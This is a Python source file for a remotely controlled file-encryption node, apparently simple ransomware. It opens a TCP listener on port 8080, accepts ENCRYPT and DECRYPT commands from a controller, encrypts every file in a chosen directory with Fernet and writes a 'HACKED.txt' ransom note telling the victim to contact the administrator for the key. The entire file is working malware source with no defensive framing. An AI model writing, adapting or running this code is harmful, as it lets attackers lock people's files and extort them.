import socket
import threading
import os
from cryptography.fernet import Fernet

class LubuntuNode:
    def __init__(self, port):
        self.port = port
        self.running = True

    def start(self):
        # Initialize the TCP server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Allow immediate reuse of the port after restart
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", self.port))
        s.listen(5)
        print(f"[*] Lubuntu Node listening on port {self.port}...")
        
        while self.running:
            # Wait for incoming connection from the controller
            conn, addr = s.accept()
            # Handle each connection in a separate thread for concurrency
            threading.Thread(target=self.handle_client, args=(conn, addr)).start()

    def handle_client(self, conn, addr):
        print(f"[!] Connection from Controller: {addr[0]}")
        while self.running:
            try:
                # Receive the command string (max 4096 bytes)
                data = conn.recv(4096).decode()
                if not data: break

                # COMMAND FORMAT: ENCRYPT|<directory>|<key>
                if data.startswith("ENCRYPT|"):
                    _, directory, key = data.split("|")
                    self.process_files(directory, key, mode="encrypt")
                    self.create_hacker_note(directory)
                    conn.send(b"[OK] Folder encrypted and note created.")

                # COMMAND FORMAT: DECRYPT|<directory>|<key>
                elif data.startswith("DECRYPT|"):
                    _, directory, key = data.split("|")
                    self.process_files(directory, key, mode="decrypt")
                    self.remove_hacker_note(directory)
                    conn.send(b"[OK] Folder decrypted and note removed.")

            except Exception as e:
                conn.send(f"[ERROR] {str(e)}".encode())
                break
        conn.close()

    def process_files(self, directory, key, mode):
        """Iterates through a directory and encrypts/decrypts all files."""
        f = Fernet(key.encode())
        for root, _, files in os.walk(directory):
            for file in files:
                # Skip the ransom note to keep it readable
                if file == "HACKED.txt": continue 
                
                path = os.path.join(root, file)
                with open(path, "rb") as file_data:
                    content = file_data.read()
                
                # Perform Fernet symmetric encryption or decryption
                processed = f.encrypt(content) if mode == "encrypt" else f.decrypt(content)
                
                with open(path, "wb") as file_data:
                    file_data.write(processed)

    def create_hacker_note(self, directory):
        """Creates a text file notifying the user of the attack."""
        with open(os.path.join(directory, "HACKED.txt"), "w") as f:
            f.write("YOU HAVE BEEN HACKED! Contact the administrator for the key.")

    def remove_hacker_note(self, directory):
        """Deletes the ransom note after successful decryption."""
        note_path = os.path.join(directory, "HACKED.txt")
        if os.path.exists(note_path):
            os.remove(note_path)

if __name__ == "__main__":
    # Start the node on port 8080
    LubuntuNode(8080).start()
